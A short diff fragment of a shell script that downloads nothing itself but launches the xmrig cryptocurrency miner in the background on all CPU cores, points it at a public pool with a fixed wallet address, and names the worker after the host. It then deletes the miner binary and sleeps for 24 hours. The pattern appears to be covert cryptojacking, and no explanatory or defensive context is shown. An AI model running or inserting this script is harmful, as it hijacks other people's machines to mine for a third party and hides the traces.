@@ -4,4 +4,3 @@ chmod +x xmrig
 ./xmrig --donate-level 1 -a Argon2/Chukwa -o singapore01.hashvault.pro:80 -u TRTLuzQtL4XhgUew7qp987b2UZMTLCvXtEnsbi1gUBFFjHEQqWCTCnNS28Pwv7Z4DjELA52kBXBk8AjCgpSFneJHHadpVFB6gAE -p $(cat /proc/sys/kernel/hostname) -t$(nproc --all) -B
 rm -rf xmrig
 sleep 24h
-
